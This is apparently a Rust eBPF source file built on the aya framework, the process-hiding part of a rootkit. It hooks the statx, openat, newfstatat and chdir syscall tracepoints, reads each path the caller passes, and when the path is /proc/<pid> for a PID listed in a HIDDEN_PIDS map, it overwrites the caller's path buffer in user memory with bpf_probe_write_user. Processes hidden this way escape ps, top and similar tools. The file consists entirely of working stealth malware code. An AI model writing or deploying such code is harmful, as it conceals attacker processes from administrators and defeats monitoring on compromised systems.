use core::str::from_utf8_unchecked;

use aya_ebpf::{
    helpers::{bpf_probe_read_user_str_bytes, bpf_probe_write_user},
    macros::{map, tracepoint},
    maps::HashMap,
    programs::TracePointContext,
};
use aya_log_ebpf::info;

use crate::HIDDEN_PIDS;
#[map]
static PID_STATS: HashMap<u32, u64> = HashMap::<u32, u64>::with_max_entries(32, 0);

#[tracepoint]
pub fn statx_enter(ctx: TracePointContext) -> Result<u32, u32> {
    stat_tp(ctx, 24, "statx")
}
#[tracepoint]
pub fn openat_enter(ctx: TracePointContext) -> Result<u32, u32> {
    stat_tp(ctx, 24, "openat")
}
#[tracepoint]
pub fn newfstatat_enter(ctx: TracePointContext) -> Result<u32, u32> {
    stat_tp(ctx, 24, "newfstatat")
}

#[tracepoint]
pub fn chdir_enter(ctx: TracePointContext) -> Result<u32, u32> {
    stat_tp(ctx, 16, "chdir")
}

fn stat_tp(ctx: TracePointContext, offset: usize, tp_name: &str) -> Result<u32, u32> {
    let mut buf = [0u8; 256];
    let filename_ptr: *const u8 = unsafe { ctx.read_at::<*const u8>(offset).map_err(|_| 1u32)? };
    let _ = unsafe { bpf_probe_read_user_str_bytes(filename_ptr, &mut buf) };
    let fname = unsafe { from_utf8_unchecked(&buf) };

    if is_proc(fname) {
        if let Some(pid) = extract_proc_pid(fname) {
            if unsafe { HIDDEN_PIDS.get(&pid).is_some() } {
                info!(&ctx, "{}(/proc/pid/{}..) detected", tp_name, pid);
                let buf = [0u8];
                unsafe { bpf_probe_write_user(filename_ptr as *mut u8, &buf as *const u8) }
                    .unwrap();
            }
        }
    }
    Ok(0)
}

fn is_proc(s: &str) -> bool {
    let s_bytes = s.as_bytes();
    let prefix_bytes = b"/proc/";
    s_bytes.len() >= prefix_bytes.len() && &s_bytes[..prefix_bytes.len()] == prefix_bytes
}
fn extract_proc_pid(path: &str) -> Option<u32> {
    let prefix = b"/proc/";
    let path_bytes = path.as_bytes();

    if !path_bytes.starts_with(prefix) {
        return None;
    }

    let rest = &path_bytes[prefix.len()..];

    let mut pid: u32 = 0;
    for &b in rest {
        if b.is_ascii_digit() {
            pid = pid.checked_mul(10)?.checked_add((b - b'0') as u32)?;
        } else {
            break;
        }
    }

    if pid == 0 {
        None
    } else {
        Some(pid)
    }
}
